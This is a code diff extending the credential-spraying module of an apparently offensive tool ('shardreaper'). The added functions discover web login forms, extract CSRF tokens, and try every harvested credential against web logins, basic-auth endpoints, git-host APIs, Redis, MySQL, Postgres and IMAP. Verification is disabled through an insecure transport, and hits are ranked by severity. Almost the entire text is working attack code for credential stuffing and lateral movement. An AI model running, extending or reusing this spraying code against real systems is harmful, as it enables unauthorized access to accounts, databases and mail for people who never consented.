@@ -30,8 +30,9 @@ Post-Cobblestone lessons 11-12, enforced in code:
 import base64
 import json
 import os
+import re
 import subprocess
-from urllib.parse import urlparse
+from urllib.parse import quote, urlparse
 
 from .k8s import (KUBELET_PORT, APISERVER_PORT, REGISTRY_PORT,
                   DOCKER_TCP_PORT, _https_request, docker_socket_version)
@@ -44,10 +45,18 @@ RBAC_MARKERS = ("forbidden", "unauthorized to", "cannot ", "denied", "rbac",
                 "user=")
 
 
-def classify_response(status, body, url=""):
+def classify_response(status, body, url="", headers=None):
     """Differential classifier. Returns (class, label). A 403 with a
-    websocket/subprotocol body is a PROTOCOL mismatch — never RBAC."""
+    websocket/subprotocol body is a PROTOCOL mismatch — never RBAC.
+    Redirects are classified by their TARGET, not by the transport."""
     b = (body or "").lower()
+    if status in (301, 302, 303, 307, 308) and headers:
+        loc = (headers or {}).get("location", "")
+        if _loginish(loc, url):
+            return ("redirect-login", f"redirect back to a login surface "
+                    f"({loc[:80]}) — authentication failed")
+        return ("redirect-other", f"redirect to {loc[:80]} — "
+                "post-auth navigation, success candidate")
     if status == 400:
         if any(m in b for m in WS_MARKERS):
             return ("400-bad-request", "websocket/upgrade required — client "
@@ -74,6 +83,17 @@ def classify_response(status, body, url=""):
     if status and status < 400:
         return ("2xx-ok", "accepted — credential valid on this surface")
     return (f"{status}-unknown", "unclassified")
+
+
+def _loginish(location, url):
+    loc = (location or "").lower()
+    if not loc:
+        return False
+    if any(k in loc for k in ("login", "signin", "sign-in", "auth", "session",
+                              "oauth", "saml")):
+        return True
+    base = (url or "").split("?")[0].rstrip("/").lower()
+    return loc.split("?")[0].rstrip("/") == base
 
 
 # ---------------- credential set ----------------
@@ -171,14 +191,19 @@ def request_forms(cred, surface_kind):
 
 # ---------------- surface builder ----------------
 def build_surfaces(eng):
-    """Every authenticated surface on the box, from recon state."""
+    """Every authenticated surface on the box, from recon state. The
+    registry is extensible (register_surface) — a closed list is the bug
+    this kills (lesson 17)."""
     hosts = set()
     for seed in eng.state.get("seeds", []):
         h = urlparse(seed if "://" in seed else "//" + seed).hostname or seed
         hosts.add(h)
     urls = []
+    ports = {}
     for t in eng.state.get("targets", []):
         hosts.add(t.get("host"))
+        ports[t.get("host")] = ports.get(t.get("host"), set()) | \
+            set((t.get("ports") or {}).keys())
         for u in t.get("urls", []):
             urls.append(u.get("url"))
         for sd in t.get("subdomains", []):
@@ -198,9 +223,30 @@ def build_surfaces(eng):
         surfaces.append({"kind": "docker-tcp", "host": h, "port": DOCKER_TCP_PORT,
                          "paths": ["/containers/json", "/version"],
                          "name": f"docker-tcp:{h}:{DOCKER_TCP_PORT}"})
+        open_ports = ports.get(h, set())
+        if 6379 in open_ports:
+            surfaces.append({"kind": "redis", "host": h, "port": 6379,
+                             "paths": [], "name": f"redis:{h}:6379"})
+        if 3306 in open_ports:
+            surfaces.append({"kind": "mysql", "host": h, "port": 3306,
+                             "paths": [], "name": f"mysql:{h}:3306"})
+        if 5432 in open_ports:
+            surfaces.append({"kind": "postgres", "host": h, "port": 5432,
+                             "paths": [], "name": f"postgres:{h}:5432"})
+        for port in (143, 993):
+            if port in open_ports:
+                surfaces.append({"kind": "imap", "host": h, "port": port,
+                                 "paths": [], "name": f"imap:{h}:{port}"})
     for u in urls:
         surfaces.append({"kind": "http", "host": "", "url": u, "paths": [],
                          "name": f"http:{u}"})
+        surfaces.append({"kind": "basic-auth", "host": "", "url": u,
+                         "paths": [], "name": f"basic-auth:{u}"})
+        surfaces.append({"kind": "git-host", "host": "", "origin": u,
+                         "paths": [], "name": f"git-host:{u}"})
+    for form in eng.state.get("login_forms", []):
+        surfaces.append(dict(form, name=form.get("name") or
+                             f"web-login:{form.get('url')}"))
     surfaces.append({"kind": "docker-socket", "host": "", "paths": [],
                      "name": "docker-socket:/var/run/docker.sock"})
     return surfaces
@@ -251,6 +297,342 @@ def _http_req(url, headers=None, timeout=6):
                           u.path or "/", headers=headers, timeout=timeout)
 
 
+# ---------------- stateful web logins (lesson 17) ----------------
+_CSRF_FIELDS = ("csrf", "_csrf", "csrf_token", "csrf-token", "_token",
+                "authenticity_token", "__requestverificationtoken",
+                "xsrf", "_xsrf", "nonce", "token")
+
+_LOGIN_FIELDS = ("user", "username", "login", "email", "id")
+_PASSWORD_FIELDS = ("password", "passwd", "pass", "pwd", "secret")
+
+
+def extract_csrf(html):
+    """CSRF token extraction from a login page. Returns (name, value) or
+    (None, None)."""
+    for m in re.finditer(r'<input\b[^>]*>', html or "", re.I | re.S):
+        tag = m.group(0)
+        name = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
+        value = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
+        if name and name.group(1).lower().replace("-", "").replace("_", "") \
+                in {f.replace("-", "").replace("_", "")
+                    for f in _CSRF_FIELDS}:
+            return name.group(1), (value.group(1) if value else "")
+    return None, None
+
+
+def parse_login_form(html, base_url):
+    """Login form contract: action, csrf field, user/password field names."""
+    form = re.search(r'<form\b[^>]*>', html or "", re.I)
+    if not form:
+        return None
+    action = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form.group(0), re.I)
+    action = (action.group(1) if action else "") or ""
+    if action.startswith("/"):
+        from urllib.parse import urlparse as _up
+        u = _up(base_url)
+        action = f"{u.scheme}://{u.netloc}{action}"
+    elif action and "://" not in action:
+        action = base_url.rstrip("/") + "/" + action
+    names = [n for n in re.findall(r'name\s*=\s*["\']([^"\']+)["\']',
+                                   html or "", re.I)]
+    user_field = next((n for n in names
+                       if n.lower() in _LOGIN_FIELDS), "username")
+    pass_field = next((n for n in names
+                       if n.lower() in _PASSWORD_FIELDS), "password")
+    return {"action": action or base_url, "user_field": user_field,
+            "pass_field": pass_field}
+
+
+def discover_login_forms(eng, transport, timeout=8, log=None):
+    """Automatic: every discovered web origin is checked for a stateful
+    login form; found forms become web-login surfaces (stored in state)."""
+    log = log or (lambda m: None)
+    found = []
+    seen = set()
+    for t in eng.state.get("targets", []):
+        for u in t.get("urls", []):
+            url = u.get("url") or ""
+            if url in seen:
+                continue
+            seen.add(url)
+            try:
+                r = transport.request("GET", url, context="anon",
+                                      timeout=timeout)
+            except OSError:
+                continue
+            body = r.get("body", "")
+            if 'type="password"' not in body and "type='password'" not in body:
+                continue
+            form = parse_login_form(body, url)
+            if not form:
+                continue
+            csrf_name, _ = extract_csrf(body)
+            surf = {"kind": "web-login", "url": url, "action": form["action"],
+                    "user_field": form["user_field"],
+                    "pass_field": form["pass_field"], "csrf_field": csrf_name,
+                    "name": f"web-login:{url}"}
+            if surf not in eng.state.setdefault("login_forms", []):
+                eng.state["login_forms"].append(surf)
+                found.append(surf)
+                log(f"login form discovered: {url} (csrf={csrf_name})")
+    if found:
+        eng.save()
+    return found
+
+
+def web_login_probe(surface, cred, transport, timeout=8):
+    """One stateful web login attempt. Uses the origin-bound transport's
+    context isolation: the CSRF-token GET rides the ANONYMOUS jar, the
+    credential POST rides a per-user AUTH jar — never mixed (lesson 16).
+    Returns a hit row or None."""
+    url = surface.get("url") or ""
+    if not url or cred.get("type") != "password":
+        return None
+    user = cred.get("user") or surface.get("user_field") or "admin"
+    try:
+        r = transport.request("GET", url, context="anon", timeout=timeout)
+        csrf_name, csrf_value = extract_csrf(r.get("body", ""))
+        form = parse_login_form(r.get("body", ""), url) or {}
+        action = form.get("action") or url
+        fields = {form.get("user_field") or "username": user,
+                  form.get("pass_field") or "password": cred.get("value")}
+        if csrf_name:
+            fields[csrf_name] = csrf_value or ""
+        body = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in
+                        fields.items()).encode()
+        ctx = f"user:{user}"
+        r2 = transport.request("POST", action, body=body,
+                               headers={"Content-Type":
+                                        "application/x-www-form-urlencoded"},
+                               context=ctx, timeout=timeout)
+        cls, label = classify_response(r2.get("status"), r2.get("body", ""),
+                                       url, headers=r2.get("headers"))
+        cred_label = f"password:{mask(cred.get('value'))}"
+        resp_body = r2.get("body", "")
+        still_login = re.search(r'type\s*=\s*["\']password', resp_body,
+                                re.I) is not None
+        if cls == "redirect-login":
+            return None
+        if cls == "redirect-other" or \
+                (r2.get("status") == 200 and not still_login):
+            return {"surface": surface["name"], "status": r2.get("status"),
+                    "credential": cred_label, "form": "web-login",
+                    "class": cls, "label": label, "hit": True,
+                    "user": user}
+        return None
+    except OSError:
+        return None
+
+
+# ---------------- extensible surface registry (lesson 17) ----------------
+# Every surface that accepts a credential is sprayable. The registry is
+# OPEN: register_surface(kind, prober) adds a new surface type at runtime.
+# prober(surface, creds, transport, timeout, log) -> list of hit rows.
+SURFACE_REGISTRY = {}
+
+
+def register_surface(kind, prober):
+    SURFACE_REGISTRY[kind] = prober
+    return kind
+
+
+def _probe_git_host(surface, creds, transport, timeout=6, log=None):
+    from . import gitmine
+    origin = surface.get("origin") or ""
+    if not origin:
+        return []
+    platform, _ = gitmine.detect_platform(origin, transport, timeout=timeout)
+    if not platform:
+        return []
+    hits = []
+    for cred in creds:
+        token = cred.get("value")
+        api = gitmine.build_api(origin, transport, token=token,
+                                platform=platform, timeout=timeout)
+        try:
+            status, data = api("/user")
+        except OSError:
+            continue
+        cls, label = classify_response(status,
+                                       json.dumps(data)[:400] if data else "",
+                                       origin)
+        if status == 200:
+            hits.append({"surface": surface["name"], "status": 200,
+                         "credential": f"{cred.get('type','?')}:"
+                                       f"{mask(token)}",
+                         "form": f"git-{platform}", "class": cls,
+                         "label": label, "hit": True, "platform": platform})
+            break
+    return hits
+
+
+def _redis_ping(host, port, password, timeout=6):
+    """Minimal RESP client (stdlib): PING, AUTH, PING."""
+    import socket as _socket
+    try:
+        s = _socket.create_connection((host, port), timeout=timeout)
+    except OSError as e:
+        return None, f"err:{e}"
+    try:
+        s.sendall(b"*1\r\n$4\r\nPING\r\n")
+        buf = b""
+        while not buf.endswith(b"\r\n") and len(buf) < 512:
+            chunk = s.recv(512)
+            if not chunk:
+                break
+            buf += chunk
+        first = buf[:64].decode("utf-8", "ignore").strip()
+        if first.startswith("-NOAUTH") and password:
+            s.sendall(b"*2\r\n$4\r\nAUTH\r\n$%d\r\n%s\r\n" %
+                      (len(password.encode()), password.encode()))
+            buf = b""
+            while not buf.endswith(b"\r\n") and len(buf) < 512:
+                chunk = s.recv(512)
+                if not chunk:
+                    break
+                buf += chunk
+            return buf.startswith(b"+OK"), buf[:80].decode("utf-8", "ignore")
+        if first.startswith("+PONG"):
+            return True, "unauthenticated PONG"
+        if first.startswith("-NOAUTH"):
+            return None, "auth required"
+        return False, first
+    except OSError as e:
+        return None, f"err:{e}"
+    finally:
+        try:
+            s.close()
+        except OSError:
+            pass
+
+
+def _probe_databases(surface, creds, transport, timeout=6, log=None):
+    hits = []
+    kind = surface.get("kind")
+    host, port = surface.get("host"), surface.get("port")
+    if kind == "redis":
+        for cred in creds:
+            ok, note = _redis_ping(host, port, cred.get("value"),
+                                   timeout=timeout)
+            if ok:
+                hits.append({"surface": surface["name"], "status": 0,
+                             "credential": f"{cred.get('type','?')}:"
+                                           f"{mask(cred.get('value'))}",
+                             "form": "redis-a" + ("uth" if note !=
+                                                  "unauthenticated PONG"
+                                                  else "non"),
+                             "class": "2xx-ok", "label": note, "hit": True})
+    elif kind in ("mysql", "postgres"):
+        client = {"mysql": "mysql", "postgres": "psql"}[kind]
+        import shutil as _sh
+        if not _sh.which(client):
+            return hits
+        for cred in creds:
+            if cred.get("type") != "password":
+                continue
+            user = cred.get("user") or "root"
+            cmd = ([client, "-h", host, "-P", str(port), "-u", user]
+                   + (["--password=" + cred.get("value")]
+                      if kind == "mysql" else []))
+            env = dict(os.environ)
+            if kind == "postgres":
+                env["PGPASSWORD"] = cred.get("value")
+                cmd += ["-c", "SELECT 1"]
+            else:
+                cmd += ["-e", "SELECT 1"]
+            try:
+                p = subprocess.run(cmd, capture_output=True, text=True,
+                                   timeout=timeout + 4, env=env)
+            except (subprocess.TimeoutExpired, OSError):
+                continue
+            if p.returncode == 0 and "ERROR" not in (p.stdout + p.stderr)[:200]:
+                hits.append({"surface": surface["name"], "status": 0,
+                             "credential": f"password:{mask(cred.get('value'))}",
+                             "form": f"{kind}-login", "class": "2xx-ok",
+                             "label": "login accepted", "hit": True})
+    return hits
+
+
+def _probe_imap(surface, creds, transport, timeout=6, log=None):
+    hits = []
+    import imaplib
+    host, port = surface.get("host"), surface.get("port")
+    ssl_mode = port in (993,)
+    for cred in creds:
+        if cred.get("type") != "password":
+            continue
+        user = cred.get("user") or surface.get("user") or "root"
+        try:
+            cls = imaplib.IMAP4_SSL if ssl_mode else imaplib.IMAP4
+            m = cls(host, port, timeout=timeout)
+            try:
+                typ, _ = m.login(user, cred.get("value"))
+                if typ == "OK":
+                    hits.append({"surface": surface["name"], "status": 0,
+                                 "credential":
+                                 f"password:{mask(cred.get('value'))}",
+                                 "form": "imap-login", "class": "2xx-ok",
+                                 "label": "IMAP login accepted", "hit": True})
+            finally:
+                try:
+                    m.logout()
+                except Exception:
+                    pass
+        except Exception:
+            continue
+    return hits
+
+
+def _probe_basic_auth(surface, creds, transport, timeout=6, log=None):
+    hits = []
+    for cred in creds:
+        for headers, form in request_forms(cred, "basic-auth"):
+            if "Authorization" not in headers:
+                continue
+            try:
+                r = transport.request("GET", surface.get("url") or "/",
+                                      headers=headers,
+                                      context=f"basic:{mask(cred.get('value'))}",
+                                      timeout=timeout)
+            except OSError:
+                continue
+            cls, label = classify_response(r.get("status"), r.get("body", ""),
+                                           surface.get("url", ""),
+                                           headers=r.get("headers"))
+            if r.get("status") == 200:
+                hits.append({"surface": surface["name"], "status": 200,
+                             "credential": f"{cred.get('type','?')}:"
+                                           f"{mask(cred.get('value'))}",
+                             "form": form, "class": cls, "label": label,
+                             "hit": True})
+                break
+            if r.get("status") != 401:
+                break
+    return hits
+
+
+def _probe_web_login(surface, creds, transport, timeout=6, log=None):
+    hits = []
+    for cred in creds:
+        row = web_login_probe(surface, cred, transport, timeout=timeout)
+        if row:
+            hits.append(row)
+    return hits
+
+
+def _register_defaults():
+    register_surface("git-host", _probe_git_host)
+    register_surface("web-login", _probe_web_login)
+    register_surface("basic-auth", _probe_basic_auth)
+    register_surface("imap", _probe_imap)
+    register_surface("redis", _probe_databases)
+    register_surface("mysql", _probe_databases)
+    register_surface("postgres", _probe_databases)
+
+
+_register_defaults()
+
+
 # ---------------- SSH probe (optional, deterministic skip if no sshpass) -----
 def ssh_probe(host, port, user, password, timeout=8):
     """Password login probe via sshpass. Returns (ok, note). Never raises."""
@@ -284,16 +666,36 @@ def mask(value):
     return v[:6] + "..." + v[-4:]
 
 
-def spray(eng, creds=None, log=None, ssh=True, probe=None, timeout=6):
+def spray(eng, creds=None, log=None, ssh=True, probe=None, timeout=6,
+          transport=None, registry=None, extra_surfaces=()):
     """Fire every held credential against every authenticated surface.
     Baseline (unauthenticated) first; a 401 anywhere automatically triggers
-    the full credential set. `probe` is injectable for tests."""
+    the full credential set. `probe` is injectable for tests; registered
+    surface kinds (web-login, git-host, databases, imap, basic-auth) run
+    through their registry probers on the origin-bound transport.
+    `extra_surfaces` appends operator/extension surfaces to the sweep."""
     log = log or (lambda m: None)
     probe = probe or probe_surface
     creds = creds or load_credentials(eng)
-    surfaces = build_surfaces(eng)
+    surfaces = build_surfaces(eng) + list(extra_surfaces)
+    registry = registry if registry is not None else SURFACE_REGISTRY
+    if transport is None:
+        from .http import OriginTransport
+        transport = OriginTransport(timeout=timeout, insecure=True)
     hits, tried = [], 0
     for surface in surfaces:
+        kind = surface.get("kind")
+        if kind in registry:
+            try:
+                for row in registry[kind](surface, creds, transport,
+                                          timeout=timeout, log=log):
+                    hits.append(row)
+                    log(f"spray HIT {surface['name']} via {row.get('form')} "
+                        f"[{row.get('status')}] {row.get('class')}")
+                tried += 1
+            except Exception as e:
+                log(f"spray {surface['name']}: prober error {e}")
+            continue
         status, body, note = probe(surface, headers=None, timeout=timeout)
         cls, label = classify_response(status, body, surface.get("name", ""))
         log(f"spray {surface['name']}: [{status}] {cls}")
@@ -351,7 +753,12 @@ def hit_severity(hit):
         return "critical" if hit.get("credential") else "high"
     if s.startswith("ssh"):
         return "critical"
-    if s.startswith("docker") or s.startswith("registry"):
+    if s.startswith("docker") or s.startswith("registry") \
+            or s.startswith("git-host"):
+        return "high"
+    if s.startswith("web-login"):
+        return "critical" if hit.get("user") in ("root", "admin") else "high"
+    if s.startswith(("mysql", "postgres", "imap")):
         return "high"
     return "medium"
 
@@ -359,6 +766,7 @@ def hit_severity(hit):
 # ---------------- CLI ----------------
 def cli_spray(args):
     from .state import Engagement
+    from .http import OriginTransport
     base = os.path.abspath(args.dir)
     if not os.path.isfile(os.path.join(base, "state.json")):
         print(f"no engagement at {base} — run: shardreaper engage ...")
@@ -369,8 +777,14 @@ def cli_spray(args):
         print("no held credentials — harvest first, or pass --creds file")
         return 2
     log = eng.log if hasattr(eng, "log") else (lambda m: print(m))
+    transport = OriginTransport(timeout=args.timeout, insecure=True)
+    # lesson 17: stateful web logins are surfaces — discover them first
+    try:
+        discover_login_forms(eng, transport, timeout=args.timeout, log=log)
+    except Exception:
+        pass
     result = spray(eng, creds, log=log, ssh=not args.no_ssh,
-                   timeout=args.timeout)
+                   timeout=args.timeout, transport=transport)
     print(f"\nspray: {result['credentials']} credential(s) × "
           f"{result['surfaces']} surface(s) = {result['probes']} probes")
     for h in result["hits"]:
@@ -386,8 +800,10 @@ def cli_spray(args):
 
 def build_arg_parser(sub):
     p = sub.add_parser("spray", help="token spray: every held credential × "
-                       "every authenticated surface (kubelet/apiserver/"
-                       "registry/ssh/docker) with all protocol variants")
+                       "every authenticated surface — kubelet/apiserver/"
+                       "registry/ssh/docker, stateful web logins (CSRF), "
+                       "git hosts, basic-auth APIs, databases, IMAP — with "
+                       "all protocol variants (extensible registry)")
     p.add_argument("dir", help="engagement folder")
     p.add_argument("--creds", action="append", default=[],
                    help="credentials file (JSON list or type:value lines)")
